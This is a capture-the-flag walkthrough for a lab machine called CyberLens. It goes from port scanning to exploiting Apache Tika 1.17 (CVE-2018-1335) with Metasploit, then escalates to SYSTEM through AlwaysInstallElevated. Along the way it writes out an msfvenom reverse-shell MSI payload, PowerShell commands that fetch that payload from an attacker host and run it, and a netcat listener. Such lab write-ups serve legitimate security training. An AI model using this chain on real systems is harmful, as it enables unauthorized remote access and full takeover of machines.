# Scenario

Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags?

# Enumeration

## \[+] 10.10.75.38 - cyberlens.thm

Using `echo` and `>>` to append the IP address with the domain name to my `/etc/hosts` file. Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online:

```sh
sudo echo '10.10.75.38 cyberlens.thm' >> /etc/hosts
export RHOSTS=10.10.75.38
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] cyberlens.thm/about.html

On this page, there is a web application which allows us to view the metadata of an image that we upload:

![a2ea2fe1abf93f81ec266b0689e6625d.png](/resources/9545c25bcb674dfebe6abfed34dec6f1.png)

In the screenshot above, I uploaded an image and pressed the "Get Metadata" button; the output below that is the metadata from the image. One interesting field is the "File Name" field which shows that the application renamed the file I uploaded from `msf.jpg` to `apache-tika-4451945236000531970.tmp`.

The filename structure gives us a hint as to what is running in the background. Let's try uploading the file and viewing the metadata again, but this time using [ZAP](zaproxy.org/) or [Burp Suite](https://portswigger.net/burp):

![646d77d288aa2e17cdb18a22e4f05f9c.png](/resources/0d34ff6b46e44535be88089e8da566f7.png)

After pressing the "Get Metadata" button, a request is made to `http://cyberlens.thm:61777` let's check that page out and see if there's anything of interest.

## \[-] Port 61777 - HTTP

### \[-] cyberlens.thm:61777

Here we find more information about the backend services, which is running Apache Tika 1.17, the filename we found in the metadata was `apache-tika` and from our Nmap scan, we also find the version number in the `http-title` field:

![0a035567497db82d19a820a7839fd3c2.png](/resources/f6c8d41ebb904767aa1b6f17780a0ec5.png)

![1730711ac2ce7da8b5ad6273a941d5fc.png](/resources/c99964a7b3464043ae751f5918140079.png)

# Initial Foothold

### \[-] CyberLens

If we search for "Apache Tika 1.17 exploit" we will find a page on [Exploit-DB (CVE-2018-1335)](https://www.exploit-db.com/exploits/47208) for the Metasploit module.

Start Metasploit using the command `msfconsole`, then select the module with `use exploit/windows/http/apache_tika_jp2_jscript`.

```sh
msfconsole
use exploit/windows/http/apache_tika_jp2_jscript
```

Check the options using: `options` and set up the correct parameters with `set <OPTION> <VALUE>`. We set `lhost` to the attacking machine's IP, set `rhosts` to `cyberlens.thm`, since we are attacking the Apache Tika server we set `rport` to `61777`, then `run` to execute the exploit.

```sh
options
set lhost <ATTACKER_IP>
set rhosts cyberlens.thm
set rport 61777
run
```

After a moment we should have a meterpreter shell in which we can type the `shell` command to get a Windows Command Prompt:

![724ea7b6b3c351d6e8e5bbec1523bb8a.png](/resources/9134693a6cad42199e7cb62dd051e1aa.png)

The user flag can be found in `C:\Users\CyberLens\Desktop\user.txt`, we can print the contents using `type`:

```cmd
cd C:\Users\CyberLens\Desktop
type user.txt
```

# Privilege Escalation

### \[-] SYSTEM

To enumerate the machine, I used [winPEAS](https://github.com/peass-ng/PEASS-ng) but you could easily do it manually as well by checkin the registry keys in the Command Prompt; if the value is set to `0x1` then it is enabled:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

To use winPEAS, first on the attacking machine - download the latest "`winPEASany_ofs.exe`" version from the [releases page](https://github.com/peass-ng/PEASS-ng/releases) then host the file using Python:

```sh
python3 -m http.server 8080
```

On the victim machine, start PowerShell using `powershell`, then download and save the file using `Invoke-WebRequest` with the `-OutFile peas.exe` flag:

```
powershell
Invoke-WebRequest <ATTACKER_IP>:8888/winPEASany_ofs.exe -OutFile peas.exe
```

After the file has been downloaded, run it using `.\peas.exe`. Scrolling through the output of winPEAS, we'll find one of many possible privilege escalation avenues:

![3336988ff90f94c87a3ab6ac9eb3f44e.png](/resources/c751faf95152465d92adf9cc12a8a476.png)

This permission allows us to install anything with elevated privileges. We can generate a reverse shell in MSI (Microsoft Installer) format using `msfvenom` on our attacking machine, set up a listener, download the payload, abuse the elevated install privileges and get a reverse shell as SYSTEM.

On the attacking machine, generate the payload using `msfvenom`:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -a x64 --platform Windows -f msi -o shell.msi
```

Host the payload using Python:

```sh
python3 -m http.server 8888
```

Then start a listener using `nc`:

```sh
nc -nvlp 4445
```

Back on the victim machine, we download the file using `Invoke-WebRequest`:

```ps
Invoke-WebRequest <ATTACKER_IP>:8888/shell.msi -OutFile shell.msi
```

After the file has been downloaded, we execute the payload:

```ps
.\shell.msi
```

Then check back on the attacking machine's listener for the connection back:

We can get the last flag in `C:\Users\Adminisrator\Desktop\admin.txt`:

```cmd
cd C:\Users\Administrator\Desktop
type admin.txt
```
